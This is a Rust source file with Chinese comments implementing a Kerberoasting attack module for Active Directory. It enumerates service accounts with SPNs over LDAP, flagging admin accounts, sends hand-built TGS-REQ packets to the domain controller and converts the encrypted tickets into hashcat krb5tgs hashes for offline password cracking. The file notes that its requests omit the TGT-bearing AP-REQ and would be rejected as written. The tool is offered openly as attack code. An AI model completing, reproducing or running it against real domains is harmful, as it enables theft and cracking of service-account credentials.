//! Kerberoasting 攻击模块
//!
//! TGS使用服务账户的NTLM哈希加密，可离线暴力破解。
//! 攻击步骤：
//! 1. LDAP查询域内注册了SPN的用户
//! 2. 对每个SPN向KDC请求TGS票据
//! 3. 提取加密部分，输出hashcat可破解格式
//! 4. 尝试使用字典进行离线破解
//!
//! 注意：完整的Kerberoast需要先通过AS-REQ/AS-REP获取TGT，
//! 然后在TGS-REQ的padata中携带AP-REQ（包含TGT）。
//! 当前实现发送的TGS-REQ不包含AP-REQ padata，真实KDC会拒绝。

use serde::{Deserialize, Serialize};

/// Kerberoasting 票据
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastTicket {
    /// 用户名
    pub username: String,
    /// 服务主体名称 (SPN)
    pub spn: String,
    /// 服务类型（MSSQLSvc, HTTP, CIFS, HOST...）
    pub service_type: String,
    /// 加密类型 (RC4-HMAC=23, AES256-CTS=18, AES128-CTS=17)
    pub etype: i32,
    /// 加密的TGS票据（DER编码）
    pub encrypted_ticket: Vec<u8>,
    /// 域名
    pub domain: String,
    /// hashcat格式输出 ($krb5tgs$23$*user$realm$spn*$checksum$cipher)
    pub hashcat_hash: String,
    /// 是否管理员账户
    pub admin_count: bool,
    /// 服务描述
    pub description: Option<String>,
}

/// 执行 Kerberoasting 攻击
///
/// # Arguments
/// * `dc` - 域控制器地址
/// * `domain` - 域名
/// * `username` - 认证用户名（可选，匿名则使用当前用户）
/// * `password` - 认证密码（可选）
pub async fn kerberoast(
    dc: &str,
    domain: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<Vec<KerberoastTicket>, String> {
    // 第一步：通过LDAP查询SPN
    let spn_targets = query_spn_users(dc, domain, username, password).await?;

    // 第二步：对每个SPN请求TGS
    let mut tickets = Vec::new();
    for target in &spn_targets {
        match request_tgs(dc, domain, target, username, password).await {
            Ok(ticket) => tickets.push(ticket),
            Err(e) => {
                tracing::warn!("请求TGS失败 (SPN={}): {}", target.spn, e);
            }
        }
    }

    Ok(tickets)
}

/// SPN用户信息
#[derive(Debug, Clone)]
struct SpnTarget {
    username: String,
    spn: String,
    service_type: String,
    admin_count: bool,
    description: Option<String>,
}

/// 通过LDAP查询注册了SPN的用户
async fn query_spn_users(
    dc: &str,
    domain: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<Vec<SpnTarget>, String> {
    let ldap_url = format!("ldap://{}:389", dc);
    let mut ldap = ldap3::LdapConn::new(&ldap_url)
        .map_err(|e| format!("LDAP连接失败: {}", e))?;

    // 绑定
    match (username, password) {
        (Some(u), Some(p)) => {
            let bind_dn = if u.contains('=') {
                u.to_string()
            } else {
                format!("{}@{}", u, domain)
            };
            ldap.simple_bind(&bind_dn, p)
                .map_err(|e| format!("LDAP认证失败: {}", e))?;
        }
        _ => {
            ldap.simple_bind("", "")
                .map_err(|e| format!("LDAP匿名绑定失败: {}", e))?;
        }
    }

    let base_dn = domain_to_dn(domain);
    let filter = "(&(servicePrincipalName=*)(objectClass=user)(!(objectClass=computer)))";
    let attrs = &[
        "sAMAccountName", "servicePrincipalName", "adminCount", "description",
    ];

    let sr = ldap
        .search(&base_dn, ldap3::Scope::Subtree, filter, attrs)
        .map_err(|e| format!("LDAP查询失败: {}", e))?;

    let mut targets = Vec::new();
    for entry in &sr.0 {
        let entry = ldap3::SearchEntry::construct(entry.clone());
        let sam = get_attr(&entry, "sAMAccountName").unwrap_or_default();
        let spns = get_attr_multi(&entry, "servicePrincipalName");
        let admin = get_attr(&entry, "adminCount").is_some();
        let desc = get_attr(&entry, "description");

        for spn in spns {
            let service_type = spn.split('/').next().unwrap_or("").to_string();
            targets.push(SpnTarget {
                username: sam.clone(),
                spn,
                service_type,
                admin_count: admin,
                description: desc.clone(),
            });
        }
    }

    Ok(targets)
}

/// 请求TGS票据
///
/// 注意：完整的Kerberoast需要有效的TGT和AP-REQ padata。
/// 当前实现不包含AP-REQ，真实KDC将返回KRB-ERROR。
async fn request_tgs(
    dc: &str,
    domain: &str,
    target: &SpnTarget,
    _username: Option<&str>,
    _password: Option<&str>,
) -> Result<KerberoastTicket, String> {
    tracing::warn!(
        "[Kerberoast] 当前TGS-REQ不包含AP-REQ padata（缺少TGT）。
         完整Kerberoast需要: 1) AS-REQ/AS-REP获取TGT  2) 用TGT构造AP-REQ padata。
         真实KDC可能拒绝此请求。"
    );

    let krb_port = 88;
    let addr = format!("{}:{}", dc, krb_port);

    let tgs_req = build_tgs_req(domain, &target.spn);

    let mut stream = tokio::net::TcpStream::connect(&addr)
        .await
        .map_err(|e| format!("连接KDC失败 ({}): {}", addr, e))?;

    // RFC 4120 Section 7.2.2: Kerberos over TCP 需要4字节大端长度前缀
    let len_prefix = (tgs_req.len() as u32).to_be_bytes();
    tokio::io::AsyncWriteExt::write_all(&mut stream, &len_prefix)
        .await
        .map_err(|e| format!("发送TGS-REQ长度前缀失败: {}", e))?;
    tokio::io::AsyncWriteExt::write_all(&mut stream, &tgs_req)
        .await
        .map_err(|e| format!("发送TGS-REQ失败: {}", e))?;

    // 读取响应: 先读4字节长度前缀，再读消息体
    let mut len_buf = [0u8; 4];
    tokio::io::AsyncReadExt::read_exact(&mut stream, &mut len_buf)
        .await
        .map_err(|e| format!("读取KDC响应长度前缀失败: {}", e))?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;

    if resp_len == 0 || resp_len > 65536 {
        return Err(format!("KDC响应长度异常: {} 字节", resp_len));
    }

    let mut buf = vec![0u8; resp_len];
    tokio::io::AsyncReadExt::read_exact(&mut stream, &mut buf)
        .await
        .map_err(|e| format!("读取TGS-REP失败: {}", e))?;

    // 检查是否为KRB-ERROR响应 (APPLICATION 30 = 0x7E)
    if is_krb_error(&buf) {
        let error_code = parse_krb_error_code(&buf);
        return Err(format!(
            "KDC返回KRB-ERROR (error_code={})。TGS-REQ需要有效的AP-REQ padata（包含TGT），\
             当前实现未获取TGT。完整Kerberoast流程: \
             1) 使用凭据发送AS-REQ获取TGT  2) 用TGT会话密钥构造AP-REQ  3) 在TGS-REQ padata中携带AP-REQ。",
            error_code
        ));
    }

    // 解析TGS-REP，提取加密票据
    let (etype, encrypted_ticket, hashcat_hash) =
        parse_tgs_rep(&buf, domain, &target.username, &target.spn)?;

    Ok(KerberoastTicket {
        username: target.username.clone(),
        spn: target.spn.clone(),
        service_type: target.service_type.clone(),
        etype,
        encrypted_ticket,
        domain: domain.to_string(),
        hashcat_hash,
        admin_count: target.admin_count,
        description: target.description.clone(),
    })
}

/// 构造 Kerberos TGS-REQ 请求
///
/// 注意：此实现为简化版本，不包含AP-REQ padata。
/// 完整的TGS-REQ需要在padata [2]中携带AP-REQ（包含TGT和Authenticator）。
fn build_tgs_req(domain: &str, spn: &str) -> Vec<u8> {
    let domain_bytes = domain.as_bytes();

    // 构造KDC-REQ-BODY
    let mut req_body = Vec::new();

    // kdc-options [0] BIT STRING
    // FORWARDABLE | RENEWABLE | CANONICALIZE = 0x50800000
    req_body.extend_from_slice(&[
        0xA0, 0x08, 0x03, 0x06, 0x00, 0x50, 0x80, 0x00, 0x00, 0x00,
    ]);

    // realm [1] GeneralString
    let realm_len = domain_bytes.len() as u8;
    req_body.push(0xA1);
    req_body.push(realm_len + 2);
    req_body.push(0x1B);
    req_body.push(realm_len);
    req_body.extend_from_slice(domain_bytes);

    // sname [2] PrincipalName
    let mut sname = Vec::new();
    // name-type [0] INTEGER 2 (NT-SRV-INST)
    sname.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x02]);

    // name-string [1] SEQUENCE OF GeneralString
    // 解析SPN为 service/host
    let parts: Vec<&str> = spn.split('/').collect();
    let mut name_string = Vec::new();
    for part in &parts {
        let p = part.as_bytes();
        name_string.push(0x1B);
        name_string.push(p.len() as u8);
        name_string.extend_from_slice(p);
    }
    let ns_len = name_string.len() as u8;
    sname.push(0xA1);
    sname.push(ns_len + 2);
    sname.push(0x30);
    sname.push(ns_len);
    sname.extend_from_slice(&name_string);

    let sname_len = sname.len() as u8;
    req_body.push(0xA2);
    req_body.push(sname_len + 2);
    req_body.push(0x30);
    req_body.push(sname_len);
    req_body.extend_from_slice(&sname);

    // till [4] GeneralizedTime (20370913024805Z)
    req_body.extend_from_slice(&[
        0xA4, 0x11, 0x18, 0x0F, 0x32, 0x30, 0x33, 0x37,
        0x30, 0x39, 0x31, 0x33, 0x30, 0x32, 0x34, 0x38,
        0x30, 0x35, 0x5A,
    ]);

    // nonce [5] INTEGER
    req_body.extend_from_slice(&[0xA5, 0x03, 0x02, 0x01, 0x7F]);

    // etype [8] SEQUENCE OF INTEGER (RC4-HMAC=23, AES256=18, AES128=17)
    req_body.extend_from_slice(&[
        0xA8, 0x0C,
        0x30, 0x0A,
        0x02, 0x01, 0x17, // 23
        0x02, 0x01, 0x12, // 18
        0x02, 0x01, 0x11, // 17
    ]);

    // 构造KDC-REQ主体
    let mut body = Vec::new();

    // pvno [0] INTEGER 5
    body.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x05]);

    // msg-type [1] INTEGER 12 (TGS-REQ)
    body.extend_from_slice(&[0xA1, 0x03, 0x02, 0x01, 0x0C]);

    // padata [2] — 当前为空（完整实现需要AP-REQ）
    // 不发送padata，KDC将返回KRB-ERROR

    // req-body [4]
    let rb_len = req_body.len();
    body.push(0xA4);
    push_asn1_length(&mut body, rb_len);
    body.extend_from_slice(&req_body);

    // 封装为 [APPLICATION 12] (TGS-REQ = 0x6C)
    let body_len = body.len();
    let mut req = Vec::new();
    req.push(0x6C); // APPLICATION 12 (TGS-REQ)
    push_asn1_length(&mut req, body_len);
    req.extend_from_slice(&body);

    req
}

/// 解析 TGS-REP 响应，提取加密票据
fn parse_tgs_rep(
    data: &[u8],
    domain: &str,
    username: &str,
    spn: &str,
) -> Result<(i32, Vec<u8>, String), String> {
    if data.is_empty() {
        return Err("TGS-REP响应为空".to_string());
    }

    // 验证APPLICATION标签: TGS-REP = [APPLICATION 13] = 0x6D
    if data.first().copied() != Some(0x6D) {
        return Err(format!(
            "非TGS-REP响应 (首字节=0x{:02X}，期望0x6D)",
            data.first().copied().unwrap_or(0)
        ));
    }

    // TGS-REP (KDC-REP) 结构:
    //   pvno[0], msg-type[1], padata[2], crealm[3], cname[4], ticket[5], enc-part[6]
    // Ticket结构: [APPLICATION 1] SEQUENCE { tkt-vno[0], realm[1], sname[2], enc-part[3] }
    // Kerberoast需要Ticket内的enc-part[3]（用服务账户密钥加密）
    // 注意：KDC-REP的crealm也是[3](0xA3)，需要跳过
    let mut etype: i32 = 23; // 默认RC4-HMAC
    let mut encrypted_ticket = Vec::new();

    // 策略：查找Ticket [APPLICATION 1] (0x61)，然后在其内部找enc-part [3]
    // 回退：遍历所有0xA3位置，找包含EncryptedData（etype+cipher）的那个
    // 找到Ticket则从Ticket内部开始搜索，否则从头遍历
    let search_start = data.windows(2).position(|w| w[0] == 0x61).unwrap_or_default();

    // 遍历所有0xA3位置，找到包含有效EncryptedData的
    let mut offset = search_start;
    while offset < data.len() {
        if let Some(rel_pos) = data[offset..].windows(2).position(|w| w[0] == 0xA3) {
            let pos = offset + rel_pos;
            let inner = &data[pos + 2..];

            // 检查是否包含etype [0] INTEGER (0xA0 ... 0x02)
            let mut found_etype: Option<i32> = None;
            if let Some(etype_pos) = inner.windows(3).position(|w| w[0] == 0xA0 && w[2] == 0x02) {
                if etype_pos + 3 < inner.len() {
                    let len_byte = inner[etype_pos + 3] as usize;
                    if etype_pos + 4 + len_byte <= inner.len() {
                        found_etype = Some(bytes_to_i32(&inner[etype_pos + 4..etype_pos + 4 + len_byte]));
                    }
                }
            }

            // 检查是否包含cipher [2] OCTET STRING (0xA2 后跟 0x04)
            let mut found_cipher: Option<Vec<u8>> = None;
            if let Some(cipher_pos) = inner.windows(2).position(|w| w[0] == 0xA2) {
                let after_tag = &inner[cipher_pos + 2..];
                if let Some(os_pos) = after_tag.windows(2).position(|w| w[0] == 0x04) {
                    let os_len = after_tag[os_pos + 1] as usize;
                    let cipher_start = os_pos + 2;
                    if cipher_start + os_len <= after_tag.len() {
                        found_cipher = Some(after_tag[cipher_start..cipher_start + os_len].to_vec());
                    }
                }
            }

            // 如果同时找到etype和cipher，这就是Ticket的enc-part
            if let (Some(et), Some(cipher)) = (found_etype, found_cipher) {
                etype = et;
                encrypted_ticket = cipher;
                break;
            }

            offset = pos + 2; // 继续搜索下一个0xA3
        } else {
            break;
        }
    }

    if encrypted_ticket.is_empty() {
        return Err("无法从TGS-REP中提取加密票据（enc-part/cipher解析失败）".to_string());
    }

    // 构造hashcat格式
    // 格式: $krb5tgs$etype$*user$realm$spn*$checksum$cipher
    // etype 23 (RC4-HMAC): checksum = 前16字节, cipher = 剩余
    // etype 17/18 (AES): checksum = 前12字节, cipher = 剩余
    let hashcat = format_krb5tgs_hashcat(etype, username, domain, spn, &encrypted_ticket);

    Ok((etype, encrypted_ticket, hashcat))
}

/// 格式化hashcat krb5tgs哈希
///
/// hashcat模式:
/// - 13100: $krb5tgs$23$*user$realm$spn*$checksum$cipher (RC4-HMAC)
/// - 19600: $krb5tgs$17$*user$realm$spn*$checksum$cipher (AES128)
/// - 19700: $krb5tgs$18$*user$realm$spn*$checksum$cipher (AES256)
fn format_krb5tgs_hashcat(
    etype: i32,
    username: &str,
    domain: &str,
    spn: &str,
    cipher: &[u8],
) -> String {
    let checksum_len = match etype {
        23 => 16, // RC4-HMAC: 16字节checksum
        17 | 18 => 12, // AES: 12字节checksum
        _ => 16,
    };

    if cipher.len() > checksum_len {
        let (checksum, rest) = cipher.split_at(checksum_len);
        format!(
            "$krb5tgs${}$*{}${}${}*${}${}",
            etype,
            username,
            domain,
            spn,
            hex::encode(checksum),
            hex::encode(rest)
        )
    } else {
        // 数据太短，无法分割checksum/cipher，整体作为cipher
        format!(
            "$krb5tgs${}$*{}${}${}*${}",
            etype,
            username,
            domain,
            spn,
            hex::encode(cipher)
        )
    }
}

/// 检查是否为KRB-ERROR响应 ([APPLICATION 30] = 0x7E)
fn is_krb_error(data: &[u8]) -> bool {
    data.first().copied() == Some(0x7E)
}

/// 从KRB-ERROR中解析error-code
///
/// KRB-ERROR ::= [APPLICATION 30] SEQUENCE {
///     ...
///     error-code [6] Int32,
///     ...
/// }
fn parse_krb_error_code(data: &[u8]) -> i32 {
    // 查找 error-code [6] 标签 (0xA6)
    if let Some(pos) = data.windows(2).position(|w| w[0] == 0xA6) {
        let after = &data[pos + 2..];
        // 跳过长度，找到INTEGER (0x02)
        if let Some(int_pos) = after.windows(2).position(|w| w[0] == 0x02) {
            let len = after[int_pos + 1] as usize;
            let start = int_pos + 2;
            if start + len <= after.len() {
                return bytes_to_i32(&after[start..start + len]);
            }
        }
    }
    -1 // 无法解析
}

/// ASN.1 DER长度编码辅助函数
fn push_asn1_length(buf: &mut Vec<u8>, len: usize) {
    if len < 0x80 {
        buf.push(len as u8);
    } else if len < 0x100 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push((len >> 8) as u8);
        buf.push((len & 0xFF) as u8);
    }
}

/// 字节数组转i32
fn bytes_to_i32(bytes: &[u8]) -> i32 {
    let mut val = 0i32;
    for &b in bytes {
        val = (val << 8) | b as i32;
    }
    val
}

/// 获取LDAP属性
fn get_attr(entry: &ldap3::SearchEntry, name: &str) -> Option<String> {
    entry.attrs.get(name).and_then(|v| v.first().cloned()).filter(|v| !v.is_empty())
}

/// 获取多个LDAP属性
fn get_attr_multi(entry: &ldap3::SearchEntry, name: &str) -> Vec<String> {
    entry.attrs.get(name).cloned().unwrap_or_default()
}

/// 域名转DN格式
fn domain_to_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_domain_to_dn() {
        assert_eq!(domain_to_dn("corp.local"), "DC=corp,DC=local");
        assert_eq!(domain_to_dn("test"), "DC=test");
    }

    #[test]
    fn test_build_tgs_req_basic() {
        let req = build_tgs_req("CORP.LOCAL", "MSSQLSvc/sql01.corp.local:1433");
        assert!(!req.is_empty());
        // TGS-REQ = [APPLICATION 12] = 0x6C
        assert_eq!(req[0], 0x6C);
    }

    #[test]
    fn test_parse_tgs_rep_empty() {
        let result = parse_tgs_rep(&[], "CORP.LOCAL", "testuser", "HTTP/web.corp.local");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_tgs_rep_wrong_tag() {
        // 非TGS-REP标签应返回错误
        let data = vec![0x6B, 0x10, 0x00]; // APPLICATION 11 (AS-REP)
        let result = parse_tgs_rep(&data, "CORP", "user", "HTTP/web");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_tgs_rep_basic() {
        // 构造模拟TGS-REP: [APPLICATION 13] + enc-part
        let data = vec![
            0x6D, 0x20, // APPLICATION 13 (TGS-REP)
            0xA3, 0x1E, // [3] enc-part
            0x30, 0x1C, // SEQUENCE
            0xA0, 0x03, 0x02, 0x01, 0x17, // etype [0] = 23 (RC4-HMAC)
            0xA2, 0x15, 0x04, 0x13, // cipher [2] OCTET STRING (19 bytes)
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
            0x10, 0x11, 0x12,
        ];
        let (etype, cipher, hashcat) = parse_tgs_rep(&data, "CORP", "user", "HTTP/web").unwrap();
        assert_eq!(etype, 23);
        assert_eq!(cipher.len(), 19);
        // hashcat格式: $krb5tgs$23$*user$CORP$HTTP/web*$checksum$cipher
        assert!(hashcat.starts_with("$krb5tgs$23$*user$CORP$HTTP/web*$"));
        // rsplit('$'): [cipher, checksum, "HTTP/web*", "CORP", "*user", "23", "krb5tgs", ""]
        let parts: Vec<&str> = hashcat.rsplit('$').collect();
        assert_eq!(parts[1].len(), 32); // 16 bytes checksum = 32 hex chars
    }

    #[test]
    fn test_format_krb5tgs_hashcat_rc4() {
        let cipher = vec![0xAA; 20]; // 20 bytes
        let hash = format_krb5tgs_hashcat(23, "svc_sql", "corp.local", "MSSQLSvc/sql01", &cipher);
        assert!(hash.starts_with("$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sql01*$"));
        // 16字节checksum + 4字节cipher
        let parts: Vec<&str> = hash.rsplit('$').collect();
        assert_eq!(parts[0].len(), 8); // 4 bytes cipher = 8 hex chars
        assert_eq!(parts[1].len(), 32); // 16 bytes checksum = 32 hex chars
    }

    #[test]
    fn test_format_krb5tgs_hashcat_aes256() {
        let cipher = vec![0xBB; 24]; // 24 bytes
        let hash = format_krb5tgs_hashcat(18, "user", "CORP", "HTTP/web", &cipher);
        assert!(hash.starts_with("$krb5tgs$18$*user$CORP$HTTP/web*$"));
        // 12字节checksum + 12字节cipher
        let parts: Vec<&str> = hash.rsplit('$').collect();
        assert_eq!(parts[0].len(), 24); // 12 bytes = 24 hex chars
        assert_eq!(parts[1].len(), 24); // 12 bytes = 24 hex chars
    }

    #[test]
    fn test_is_krb_error() {
        assert!(is_krb_error(&[0x7E, 0x00]));
        assert!(!is_krb_error(&[0x6D, 0x00])); // TGS-REP
        assert!(!is_krb_error(&[]));
    }

    #[test]
    fn test_parse_krb_error_code() {
        // 模拟KRB-ERROR，error-code = 25 (KDC_ERR_PREAUTH_REQUIRED)
        let data = vec![
            0x7E, 0x10, // APPLICATION 30
            0xA6, 0x03, 0x02, 0x01, 0x19, // error-code [6] = 25
        ];
        assert_eq!(parse_krb_error_code(&data), 25);
    }

    #[test]
    fn test_push_asn1_length() {
        let mut buf = Vec::new();
        push_asn1_length(&mut buf, 50);
        assert_eq!(buf, vec![50]); // 短格式

        buf.clear();
        push_asn1_length(&mut buf, 200);
        assert_eq!(buf, vec![0x81, 200]); // 1字节长格式

        buf.clear();
        push_asn1_length(&mut buf, 300);
        assert_eq!(buf, vec![0x82, 0x01, 0x2C]); // 2字节长格式
    }

    #[test]
    fn test_kerberoast_ticket_creation() {
        let ticket = KerberoastTicket {
            username: "svc_sql".to_string(),
            spn: "MSSQLSvc/sql01.corp.local:1433".to_string(),
            service_type: "MSSQLSvc".to_string(),
            etype: 23,
            encrypted_ticket: vec![0xDE, 0xAD, 0xBE, 0xEF],
            domain: "corp.local".to_string(),
            hashcat_hash: "$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sql01.corp.local:1433*$dead$beef".to_string(),
            admin_count: false,
            description: Some("SQL服务账户".to_string()),
        };

        assert_eq!(ticket.username, "svc_sql");
        assert_eq!(ticket.etype, 23);
        assert!(ticket.hashcat_hash.contains("$krb5tgs$23$"));
    }
}
